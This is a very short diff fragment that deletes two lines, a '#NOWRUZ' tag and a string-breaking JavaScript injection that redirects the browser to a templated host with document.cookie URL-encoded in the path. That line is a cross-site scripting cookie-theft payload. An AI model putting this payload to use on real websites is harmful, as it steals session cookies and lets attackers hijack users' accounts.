@@ -1,2 +1,0 @@
-#NOWRUZ
-"); window.location = 'http://{server}.com/'+encodeURI(document.cookie)//
